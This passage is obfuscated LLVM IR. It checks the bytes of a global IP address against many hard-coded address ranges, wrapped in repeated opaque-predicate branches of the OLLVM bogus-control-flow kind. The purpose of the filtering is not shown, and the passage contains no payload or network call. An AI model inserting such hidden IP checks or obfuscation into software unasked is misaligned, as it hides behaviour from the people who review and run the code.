; <label>:2966:                                   ; preds = %2962, %2958, %originalBBpart2404, %2934
  %2967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2968 = zext i8 %2967 to i32
  %2969 = icmp eq i32 %2968, 66
  br i1 %2969, label %2970, label %2982

; <label>:2970:                                   ; preds = %2966
  %2971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2972 = zext i8 %2971 to i32
  %2973 = icmp eq i32 %2972, 55
  br i1 %2973, label %2974, label %2982

; <label>:2974:                                   ; preds = %2970
  %2975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2976 = zext i8 %2975 to i32
  %2977 = icmp sge i32 %2976, 128
  br i1 %2977, label %2978, label %2982

; <label>:2978:                                   ; preds = %2974
  %2979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2980 = zext i8 %2979 to i32
  %2981 = icmp slt i32 %2980, 159
  br i1 %2981, label %5298, label %2982

; <label>:2982:                                   ; preds = %2978, %2974, %2970, %2966
  %2983 = load i32, i32* @x.65
  %2984 = load i32, i32* @y.66
  %2985 = sub i32 %2983, 1
  %2986 = mul i32 %2983, %2985
  %2987 = urem i32 %2986, 2
  %2988 = icmp eq i32 %2987, 0
  %2989 = icmp slt i32 %2984, 10
  %2990 = or i1 %2988, %2989
  br i1 %2990, label %originalBB406, label %originalBB406alteredBB

originalBB406:                                    ; preds = %originalBB406alteredBB, %2982
  %2991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2992 = zext i8 %2991 to i32
  %2993 = icmp eq i32 %2992, 45
  %2994 = load i32, i32* @x.65
  %2995 = load i32, i32* @y.66
  %2996 = sub i32 %2994, 1
  %2997 = mul i32 %2994, %2996
  %2998 = urem i32 %2997, 2
  %2999 = icmp eq i32 %2998, 0
  %3000 = icmp slt i32 %2995, 10
  %3001 = or i1 %2999, %3000
  br i1 %3001, label %originalBBpart2408, label %originalBB406alteredBB

originalBBpart2408:                               ; preds = %originalBB406
  br i1 %2993, label %3002, label %3030

; <label>:3002:                                   ; preds = %originalBBpart2408
  %3003 = load i32, i32* @x.65
  %3004 = load i32, i32* @y.66
  %3005 = sub i32 %3003, 1
  %3006 = mul i32 %3003, %3005
  %3007 = urem i32 %3006, 2
  %3008 = icmp eq i32 %3007, 0
  %3009 = icmp slt i32 %3004, 10
  %3010 = or i1 %3008, %3009
  br i1 %3010, label %originalBB410, label %originalBB410alteredBB

originalBB410:                                    ; preds = %originalBB410alteredBB, %3002
  %3011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3012 = zext i8 %3011 to i32
  %3013 = icmp eq i32 %3012, 63
  %3014 = load i32, i32* @x.65
  %3015 = load i32, i32* @y.66
  %3016 = sub i32 %3014, 1
  %3017 = mul i32 %3014, %3016
  %3018 = urem i32 %3017, 2
  %3019 = icmp eq i32 %3018, 0
  %3020 = icmp slt i32 %3015, 10
  %3021 = or i1 %3019, %3020
  br i1 %3021, label %originalBBpart2412, label %originalBB410alteredBB

originalBBpart2412:                               ; preds = %originalBB410
  br i1 %3013, label %3022, label %3030

; <label>:3022:                                   ; preds = %originalBBpart2412
  %3023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3024 = zext i8 %3023 to i32
  %3025 = icmp sge i32 %3024, 1
  br i1 %3025, label %3026, label %3030

; <label>:3026:                                   ; preds = %3022
  %3027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3028 = zext i8 %3027 to i32
  %3029 = icmp slt i32 %3028, 127
  br i1 %3029, label %5298, label %3030

; <label>:3030:                                   ; preds = %3026, %3022, %originalBBpart2412, %originalBBpart2408
  %3031 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3032 = zext i8 %3031 to i32
  %3033 = icmp eq i32 %3032, 216
  br i1 %3033, label %3034, label %3078

; <label>:3034:                                   ; preds = %3030
  %3035 = load i32, i32* @x.65
  %3036 = load i32, i32* @y.66
  %3037 = sub i32 %3035, 1
  %3038 = mul i32 %3035, %3037
  %3039 = urem i32 %3038, 2
  %3040 = icmp eq i32 %3039, 0
  %3041 = icmp slt i32 %3036, 10
  %3042 = or i1 %3040, %3041
  br i1 %3042, label %originalBB414, label %originalBB414alteredBB

originalBB414:                                    ; preds = %originalBB414alteredBB, %3034
  %3043 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3044 = zext i8 %3043 to i32
  %3045 = icmp eq i32 %3044, 237
  %3046 = load i32, i32* @x.65
  %3047 = load i32, i32* @y.66
  %3048 = sub i32 %3046, 1
  %3049 = mul i32 %3046, %3048
  %3050 = urem i32 %3049, 2
  %3051 = icmp eq i32 %3050, 0
  %3052 = icmp slt i32 %3047, 10
  %3053 = or i1 %3051, %3052
  br i1 %3053, label %originalBBpart2416, label %originalBB414alteredBB

originalBBpart2416:                               ; preds = %originalBB414
  br i1 %3045, label %3054, label %3078

; <label>:3054:                                   ; preds = %originalBBpart2416
  %3055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3056 = zext i8 %3055 to i32
  %3057 = icmp sge i32 %3056, 128
  br i1 %3057, label %3058, label %3078

; <label>:3058:                                   ; preds = %3054
  %3059 = load i32, i32* @x.65
  %3060 = load i32, i32* @y.66
  %3061 = sub i32 %3059, 1
  %3062 = mul i32 %3059, %3061
  %3063 = urem i32 %3062, 2
  %3064 = icmp eq i32 %3063, 0
  %3065 = icmp slt i32 %3060, 10
  %3066 = or i1 %3064, %3065
  br i1 %3066, label %originalBB418, label %originalBB418alteredBB

originalBB418:                                    ; preds = %originalBB418alteredBB, %3058
  %3067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3068 = zext i8 %3067 to i32
  %3069 = icmp slt i32 %3068, 159
  %3070 = load i32, i32* @x.65
  %3071 = load i32, i32* @y.66
  %3072 = sub i32 %3070, 1
  %3073 = mul i32 %3070, %3072
  %3074 = urem i32 %3073, 2
  %3075 = icmp eq i32 %3074, 0
  %3076 = icmp slt i32 %3071, 10
  %3077 = or i1 %3075, %3076
  br i1 %3077, label %originalBBpart2420, label %originalBB418alteredBB

originalBBpart2420:                               ; preds = %originalBB418
  br i1 %3069, label %5298, label %3078

; <label>:3078:                                   ; preds = %originalBBpart2420, %3054, %originalBBpart2416, %3030
  %3079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3080 = zext i8 %3079 to i32
  %3081 = icmp eq i32 %3080, 108
  br i1 %3081, label %3082, label %3086

; <label>:3082:                                   ; preds = %3078
  %3083 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3084 = zext i8 %3083 to i32
  %3085 = icmp eq i32 %3084, 61
  br i1 %3085, label %5298, label %3086

; <label>:3086:                                   ; preds = %3082, %3078
  %3087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3088 = zext i8 %3087 to i32
  %3089 = icmp eq i32 %3088, 45
  br i1 %3089, label %3090, label %3094

; <label>:3090:                                   ; preds = %3086
  %3091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3092 = zext i8 %3091 to i32
  %3093 = icmp eq i32 %3092, 76
  br i1 %3093, label %5298, label %3094

; <label>:3094:                                   ; preds = %3090, %3086
  %3095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3096 = zext i8 %3095 to i32
  %3097 = icmp eq i32 %3096, 185
  br i1 %3097, label %3098, label %3110

; <label>:3098:                                   ; preds = %3094
  %3099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3100 = zext i8 %3099 to i32
  %3101 = icmp eq i32 %3100, 11
  br i1 %3101, label %3102, label %3110

; <label>:3102:                                   ; preds = %3098
  %3103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3104 = zext i8 %3103 to i32
  %3105 = icmp sge i32 %3104, 144
  br i1 %3105, label %3106, label %3110

; <label>:3106:                                   ; preds = %3102
  %3107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3108 = zext i8 %3107 to i32
  %3109 = icmp slt i32 %3108, 148
  br i1 %3109, label %5298, label %3110

; <label>:3110:                                   ; preds = %3106, %3102, %3098, %3094
  %3111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3112 = zext i8 %3111 to i32
  %3113 = icmp eq i32 %3112, 185
  br i1 %3113, label %3114, label %3142

; <label>:3114:                                   ; preds = %3110
  %3115 = load i32, i32* @x.65
  %3116 = load i32, i32* @y.66
  %3117 = sub i32 %3115, 1
  %3118 = mul i32 %3115, %3117
  %3119 = urem i32 %3118, 2
  %3120 = icmp eq i32 %3119, 0
  %3121 = icmp slt i32 %3116, 10
  %3122 = or i1 %3120, %3121
  br i1 %3122, label %originalBB422, label %originalBB422alteredBB

originalBB422:                                    ; preds = %originalBB422alteredBB, %3114
  %3123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3124 = zext i8 %3123 to i32
  %3125 = icmp eq i32 %3124, 56
  %3126 = load i32, i32* @x.65
  %3127 = load i32, i32* @y.66
  %3128 = sub i32 %3126, 1
  %3129 = mul i32 %3126, %3128
  %3130 = urem i32 %3129, 2
  %3131 = icmp eq i32 %3130, 0
  %3132 = icmp slt i32 %3127, 10
  %3133 = or i1 %3131, %3132
  br i1 %3133, label %originalBBpart2424, label %originalBB422alteredBB

originalBBpart2424:                               ; preds = %originalBB422
  br i1 %3125, label %3134, label %3142

; <label>:3134:                                   ; preds = %originalBBpart2424
  %3135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3136 = zext i8 %3135 to i32
  %3137 = icmp sge i32 %3136, 21
  br i1 %3137, label %3138, label %3142

; <label>:3138:                                   ; preds = %3134
  %3139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3140 = zext i8 %3139 to i32
  %3141 = icmp slt i32 %3140, 23
  br i1 %3141, label %5298, label %3142

; <label>:3142:                                   ; preds = %3138, %3134, %originalBBpart2424, %3110
  %3143 = load i32, i32* @x.65
  %3144 = load i32, i32* @y.66
  %3145 = sub i32 %3143, 1
  %3146 = mul i32 %3143, %3145
  %3147 = urem i32 %3146, 2
  %3148 = icmp eq i32 %3147, 0
  %3149 = icmp slt i32 %3144, 10
  %3150 = or i1 %3148, %3149
  br i1 %3150, label %originalBB426, label %originalBB426alteredBB

originalBB426:                                    ; preds = %originalBB426alteredBB, %3142
  %3151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3152 = zext i8 %3151 to i32
  %3153 = icmp eq i32 %3152, 185
  %3154 = load i32, i32* @x.65
  %3155 = load i32, i32* @y.66
  %3156 = sub i32 %3154, 1
  %3157 = mul i32 %3154, %3156
  %3158 = urem i32 %3157, 2
  %3159 = icmp eq i32 %3158, 0
  %3160 = icmp slt i32 %3155, 10
  %3161 = or i1 %3159, %3160
  br i1 %3161, label %originalBBpart2428, label %originalBB426alteredBB

originalBBpart2428:                               ; preds = %originalBB426
  br i1 %3153, label %3162, label %3222

; <label>:3162:                                   ; preds = %originalBBpart2428
  %3163 = load i32, i32* @x.65
  %3164 = load i32, i32* @y.66
  %3165 = sub i32 %3163, 1
  %3166 = mul i32 %3163, %3165
  %3167 = urem i32 %3166, 2
  %3168 = icmp eq i32 %3167, 0
  %3169 = icmp slt i32 %3164, 10
  %3170 = or i1 %3168, %3169
  br i1 %3170, label %originalBB430, label %originalBB430alteredBB

originalBB430:                                    ; preds = %originalBB430alteredBB, %3162
  %3171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3172 = zext i8 %3171 to i32
  %3173 = icmp eq i32 %3172, 61
  %3174 = load i32, i32* @x.65
  %3175 = load i32, i32* @y.66
  %3176 = sub i32 %3174, 1
  %3177 = mul i32 %3174, %3176
  %3178 = urem i32 %3177, 2
  %3179 = icmp eq i32 %3178, 0
  %3180 = icmp slt i32 %3175, 10
  %3181 = or i1 %3179, %3180
  br i1 %3181, label %originalBBpart2432, label %originalBB430alteredBB

originalBBpart2432:                               ; preds = %originalBB430
  br i1 %3173, label %3182, label %3222

; <label>:3182:                                   ; preds = %originalBBpart2432
  %3183 = load i32, i32* @x.65
  %3184 = load i32, i32* @y.66
  %3185 = sub i32 %3183, 1
  %3186 = mul i32 %3183, %3185
  %3187 = urem i32 %3186, 2
  %3188 = icmp eq i32 %3187, 0
  %3189 = icmp slt i32 %3184, 10
  %3190 = or i1 %3188, %3189
  br i1 %3190, label %originalBB434, label %originalBB434alteredBB

originalBB434:                                    ; preds = %originalBB434alteredBB, %3182
  %3191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3192 = zext i8 %3191 to i32
  %3193 = icmp sge i32 %3192, 136
  %3194 = load i32, i32* @x.65
  %3195 = load i32, i32* @y.66
  %3196 = sub i32 %3194, 1
  %3197 = mul i32 %3194, %3196
  %3198 = urem i32 %3197, 2
  %3199 = icmp eq i32 %3198, 0
  %3200 = icmp slt i32 %3195, 10
  %3201 = or i1 %3199, %3200
  br i1 %3201, label %originalBBpart2436, label %originalBB434alteredBB

originalBBpart2436:                               ; preds = %originalBB434
  br i1 %3193, label %3202, label %3222

; <label>:3202:                                   ; preds = %originalBBpart2436
  %3203 = load i32, i32* @x.65
  %3204 = load i32, i32* @y.66
  %3205 = sub i32 %3203, 1
  %3206 = mul i32 %3203, %3205
  %3207 = urem i32 %3206, 2
  %3208 = icmp eq i32 %3207, 0
  %3209 = icmp slt i32 %3204, 10
  %3210 = or i1 %3208, %3209
  br i1 %3210, label %originalBB438, label %originalBB438alteredBB

originalBB438:                                    ; preds = %originalBB438alteredBB, %3202
  %3211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3212 = zext i8 %3211 to i32
  %3213 = icmp slt i32 %3212, 139
  %3214 = load i32, i32* @x.65
  %3215 = load i32, i32* @y.66
  %3216 = sub i32 %3214, 1
  %3217 = mul i32 %3214, %3216
  %3218 = urem i32 %3217, 2
  %3219 = icmp eq i32 %3218, 0
  %3220 = icmp slt i32 %3215, 10
  %3221 = or i1 %3219, %3220
  br i1 %3221, label %originalBBpart2440, label %originalBB438alteredBB

originalBBpart2440:                               ; preds = %originalBB438
  br i1 %3213, label %5298, label %3222

; <label>:3222:                                   ; preds = %originalBBpart2440, %originalBBpart2436, %originalBBpart2432, %originalBBpart2428
  %3223 = load i32, i32* @x.65
  %3224 = load i32, i32* @y.66
  %3225 = sub i32 %3223, 1
  %3226 = mul i32 %3223, %3225
  %3227 = urem i32 %3226, 2
  %3228 = icmp eq i32 %3227, 0
  %3229 = icmp slt i32 %3224, 10
  %3230 = or i1 %3228, %3229
  br i1 %3230, label %originalBB442, label %originalBB442alteredBB

originalBB442:                                    ; preds = %originalBB442alteredBB, %3222
  %3231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3232 = zext i8 %3231 to i32
  %3233 = icmp eq i32 %3232, 185
  %3234 = load i32, i32* @x.65
  %3235 = load i32, i32* @y.66
  %3236 = sub i32 %3234, 1
  %3237 = mul i32 %3234, %3236
  %3238 = urem i32 %3237, 2
  %3239 = icmp eq i32 %3238, 0
  %3240 = icmp slt i32 %3235, 10
  %3241 = or i1 %3239, %3240
  br i1 %3241, label %originalBBpart2444, label %originalBB442alteredBB

originalBBpart2444:                               ; preds = %originalBB442
  br i1 %3233, label %3242, label %3302

; <label>:3242:                                   ; preds = %originalBBpart2444
  %3243 = load i32, i32* @x.65
  %3244 = load i32, i32* @y.66
  %3245 = sub i32 %3243, 1
  %3246 = mul i32 %3243, %3245
  %3247 = urem i32 %3246, 2
  %3248 = icmp eq i32 %3247, 0
  %3249 = icmp slt i32 %3244, 10
  %3250 = or i1 %3248, %3249
  br i1 %3250, label %originalBB446, label %originalBB446alteredBB

originalBB446:                                    ; preds = %originalBB446alteredBB, %3242
  %3251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3252 = zext i8 %3251 to i32
  %3253 = icmp eq i32 %3252, 62
  %3254 = load i32, i32* @x.65
  %3255 = load i32, i32* @y.66
  %3256 = sub i32 %3254, 1
  %3257 = mul i32 %3254, %3256
  %3258 = urem i32 %3257, 2
  %3259 = icmp eq i32 %3258, 0
  %3260 = icmp slt i32 %3255, 10
  %3261 = or i1 %3259, %3260
  br i1 %3261, label %originalBBpart2448, label %originalBB446alteredBB

originalBBpart2448:                               ; preds = %originalBB446
  br i1 %3253, label %3262, label %3302

; <label>:3262:                                   ; preds = %originalBBpart2448
  %3263 = load i32, i32* @x.65
  %3264 = load i32, i32* @y.66
  %3265 = sub i32 %3263, 1
  %3266 = mul i32 %3263, %3265
  %3267 = urem i32 %3266, 2
  %3268 = icmp eq i32 %3267, 0
  %3269 = icmp slt i32 %3264, 10
  %3270 = or i1 %3268, %3269
  br i1 %3270, label %originalBB450, label %originalBB450alteredBB

originalBB450:                                    ; preds = %originalBB450alteredBB, %3262
  %3271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3272 = zext i8 %3271 to i32
  %3273 = icmp sge i32 %3272, 187
  %3274 = load i32, i32* @x.65
  %3275 = load i32, i32* @y.66
  %3276 = sub i32 %3274, 1
  %3277 = mul i32 %3274, %3276
  %3278 = urem i32 %3277, 2
  %3279 = icmp eq i32 %3278, 0
  %3280 = icmp slt i32 %3275, 10
  %3281 = or i1 %3279, %3280
  br i1 %3281, label %originalBBpart2452, label %originalBB450alteredBB

originalBBpart2452:                               ; preds = %originalBB450
  br i1 %3273, label %3282, label %3302

; <label>:3282:                                   ; preds = %originalBBpart2452
  %3283 = load i32, i32* @x.65
  %3284 = load i32, i32* @y.66
  %3285 = sub i32 %3283, 1
  %3286 = mul i32 %3283, %3285
  %3287 = urem i32 %3286, 2
  %3288 = icmp eq i32 %3287, 0
  %3289 = icmp slt i32 %3284, 10
  %3290 = or i1 %3288, %3289
  br i1 %3290, label %originalBB454, label %originalBB454alteredBB

originalBB454:                                    ; preds = %originalBB454alteredBB, %3282
  %3291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3292 = zext i8 %3291 to i32
  %3293 = icmp slt i32 %3292, 191
  %3294 = load i32, i32* @x.65
  %3295 = load i32, i32* @y.66
  %3296 = sub i32 %3294, 1
  %3297 = mul i32 %3294, %3296
  %3298 = urem i32 %3297, 2
  %3299 = icmp eq i32 %3298, 0
  %3300 = icmp slt i32 %3295, 10
  %3301 = or i1 %3299, %3300
  br i1 %3301, label %originalBBpart2456, label %originalBB454alteredBB

originalBBpart2456:                               ; preds = %originalBB454
  br i1 %3293, label %5298, label %3302

; <label>:3302:                                   ; preds = %originalBBpart2456, %originalBBpart2452, %originalBBpart2448, %originalBBpart2444
  %3303 = load i32, i32* @x.65
  %3304 = load i32, i32* @y.66
  %3305 = sub i32 %3303, 1
  %3306 = mul i32 %3303, %3305
  %3307 = urem i32 %3306, 2
  %3308 = icmp eq i32 %3307, 0
  %3309 = icmp slt i32 %3304, 10
  %3310 = or i1 %3308, %3309
  br i1 %3310, label %originalBB458, label %originalBB458alteredBB

originalBB458:                                    ; preds = %originalBB458alteredBB, %3302
  %3311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3312 = zext i8 %3311 to i32
  %3313 = icmp eq i32 %3312, 66
  %3314 = load i32, i32* @x.65
  %3315 = load i32, i32* @y.66
  %3316 = sub i32 %3314, 1
  %3317 = mul i32 %3314, %3316
  %3318 = urem i32 %3317, 2
  %3319 = icmp eq i32 %3318, 0
  %3320 = icmp slt i32 %3315, 10
  %3321 = or i1 %3319, %3320
  br i1 %3321, label %originalBBpart2460, label %originalBB458alteredBB

originalBBpart2460:                               ; preds = %originalBB458
  br i1 %3313, label %3322, label %3350

; <label>:3322:                                   ; preds = %originalBBpart2460
  %3323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3324 = zext i8 %3323 to i32
  %3325 = icmp eq i32 %3324, 150
  br i1 %3325, label %3326, label %3350

; <label>:3326:                                   ; preds = %3322
  %3327 = load i32, i32* @x.65
  %3328 = load i32, i32* @y.66
  %3329 = sub i32 %3327, 1
  %3330 = mul i32 %3327, %3329
  %3331 = urem i32 %3330, 2
  %3332 = icmp eq i32 %3331, 0
  %3333 = icmp slt i32 %3328, 10
  %3334 = or i1 %3332, %3333
  br i1 %3334, label %originalBB462, label %originalBB462alteredBB

originalBB462:                                    ; preds = %originalBB462alteredBB, %3326
  %3335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3336 = zext i8 %3335 to i32
  %3337 = icmp sge i32 %3336, 120
  %3338 = load i32, i32* @x.65
  %3339 = load i32, i32* @y.66
  %3340 = sub i32 %3338, 1
  %3341 = mul i32 %3338, %3340
  %3342 = urem i32 %3341, 2
  %3343 = icmp eq i32 %3342, 0
  %3344 = icmp slt i32 %3339, 10
  %3345 = or i1 %3343, %3344
  br i1 %3345, label %originalBBpart2464, label %originalBB462alteredBB

originalBBpart2464:                               ; preds = %originalBB462
  br i1 %3337, label %3346, label %3350

; <label>:3346:                                   ; preds = %originalBBpart2464
  %3347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3348 = zext i8 %3347 to i32
  %3349 = icmp slt i32 %3348, 215
  br i1 %3349, label %5298, label %3350

; <label>:3350:                                   ; preds = %3346, %originalBBpart2464, %3322, %originalBBpart2460
  %3351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3352 = zext i8 %3351 to i32
  %3353 = icmp eq i32 %3352, 66
  br i1 %3353, label %3354, label %3366

; <label>:3354:                                   ; preds = %3350
  %3355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3356 = zext i8 %3355 to i32
  %3357 = icmp eq i32 %3356, 151
  br i1 %3357, label %3358, label %3366

; <label>:3358:                                   ; preds = %3354
  %3359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3360 = zext i8 %3359 to i32
  %3361 = icmp sge i32 %3360, 137
  br i1 %3361, label %3362, label %3366

; <label>:3362:                                   ; preds = %3358
  %3363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3364 = zext i8 %3363 to i32
  %3365 = icmp slt i32 %3364, 139
  br i1 %3365, label %5298, label %3366

; <label>:3366:                                   ; preds = %3362, %3358, %3354, %3350
  %3367 = load i32, i32* @x.65
  %3368 = load i32, i32* @y.66
  %3369 = sub i32 %3367, 1
  %3370 = mul i32 %3367, %3369
  %3371 = urem i32 %3370, 2
  %3372 = icmp eq i32 %3371, 0
  %3373 = icmp slt i32 %3368, 10
  %3374 = or i1 %3372, %3373
  br i1 %3374, label %originalBB466, label %originalBB466alteredBB

originalBB466:                                    ; preds = %originalBB466alteredBB, %3366
  %3375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3376 = zext i8 %3375 to i32
  %3377 = icmp eq i32 %3376, 64
  %3378 = load i32, i32* @x.65
  %3379 = load i32, i32* @y.66
  %3380 = sub i32 %3378, 1
  %3381 = mul i32 %3378, %3380
  %3382 = urem i32 %3381, 2
  %3383 = icmp eq i32 %3382, 0
  %3384 = icmp slt i32 %3379, 10
  %3385 = or i1 %3383, %3384
  br i1 %3385, label %originalBBpart2468, label %originalBB466alteredBB

originalBBpart2468:                               ; preds = %originalBB466
  br i1 %3377, label %3386, label %3398

; <label>:3386:                                   ; preds = %originalBBpart2468
  %3387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3388 = zext i8 %3387 to i32
  %3389 = icmp eq i32 %3388, 94
  br i1 %3389, label %3390, label %3398

; <label>:3390:                                   ; preds = %3386
  %3391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3392 = zext i8 %3391 to i32
  %3393 = icmp sge i32 %3392, 237
  br i1 %3393, label %3394, label %3398

; <label>:3394:                                   ; preds = %3390
  %3395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3396 = zext i8 %3395 to i32
  %3397 = icmp slt i32 %3396, 255
  br i1 %3397, label %5298, label %3398

; <label>:3398:                                   ; preds = %3394, %3390, %3386, %originalBBpart2468
  %3399 = load i32, i32* @x.65
  %3400 = load i32, i32* @y.66
  %3401 = sub i32 %3399, 1
  %3402 = mul i32 %3399, %3401
  %3403 = urem i32 %3402, 2
  %3404 = icmp eq i32 %3403, 0
  %3405 = icmp slt i32 %3400, 10
  %3406 = or i1 %3404, %3405
  br i1 %3406, label %originalBB470, label %originalBB470alteredBB

originalBB470:                                    ; preds = %originalBB470alteredBB, %3398
  %3407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3408 = zext i8 %3407 to i32
  %3409 = icmp eq i32 %3408, 63
  %3410 = load i32, i32* @x.65
  %3411 = load i32, i32* @y.66
  %3412 = sub i32 %3410, 1
  %3413 = mul i32 %3410, %3412
  %3414 = urem i32 %3413, 2
  %3415 = icmp eq i32 %3414, 0
  %3416 = icmp slt i32 %3411, 10
  %3417 = or i1 %3415, %3416
  br i1 %3417, label %originalBBpart2472, label %originalBB470alteredBB

originalBBpart2472:                               ; preds = %originalBB470
  br i1 %3409, label %3418, label %3478

; <label>:3418:                                   ; preds = %originalBBpart2472
  %3419 = load i32, i32* @x.65
  %3420 = load i32, i32* @y.66
  %3421 = sub i32 %3419, 1
  %3422 = mul i32 %3419, %3421
  %3423 = urem i32 %3422, 2
  %3424 = icmp eq i32 %3423, 0
  %3425 = icmp slt i32 %3420, 10
  %3426 = or i1 %3424, %3425
  br i1 %3426, label %originalBB474, label %originalBB474alteredBB

originalBB474:                                    ; preds = %originalBB474alteredBB, %3418
  %3427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3428 = zext i8 %3427 to i32
  %3429 = icmp eq i32 %3428, 251
  %3430 = load i32, i32* @x.65
  %3431 = load i32, i32* @y.66
  %3432 = sub i32 %3430, 1
  %3433 = mul i32 %3430, %3432
  %3434 = urem i32 %3433, 2
  %3435 = icmp eq i32 %3434, 0
  %3436 = icmp slt i32 %3431, 10
  %3437 = or i1 %3435, %3436
  br i1 %3437, label %originalBBpart2476, label %originalBB474alteredBB

originalBBpart2476:                               ; preds = %originalBB474
  br i1 %3429, label %3438, label %3478

; <label>:3438:                                   ; preds = %originalBBpart2476
  %3439 = load i32, i32* @x.65
  %3440 = load i32, i32* @y.66
  %3441 = sub i32 %3439, 1
  %3442 = mul i32 %3439, %3441
  %3443 = urem i32 %3442, 2
  %3444 = icmp eq i32 %3443, 0
  %3445 = icmp slt i32 %3440, 10
  %3446 = or i1 %3444, %3445
  br i1 %3446, label %originalBB478, label %originalBB478alteredBB

originalBB478:                                    ; preds = %originalBB478alteredBB, %3438
  %3447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3448 = zext i8 %3447 to i32
  %3449 = icmp sge i32 %3448, 19
  %3450 = load i32, i32* @x.65
  %3451 = load i32, i32* @y.66
  %3452 = sub i32 %3450, 1
  %3453 = mul i32 %3450, %3452
  %3454 = urem i32 %3453, 2
  %3455 = icmp eq i32 %3454, 0
  %3456 = icmp slt i32 %3451, 10
  %3457 = or i1 %3455, %3456
  br i1 %3457, label %originalBBpart2480, label %originalBB478alteredBB

originalBBpart2480:                               ; preds = %originalBB478
  br i1 %3449, label %3458, label %3478

; <label>:3458:                                   ; preds = %originalBBpart2480
  %3459 = load i32, i32* @x.65
  %3460 = load i32, i32* @y.66
  %3461 = sub i32 %3459, 1
  %3462 = mul i32 %3459, %3461
  %3463 = urem i32 %3462, 2
  %3464 = icmp eq i32 %3463, 0
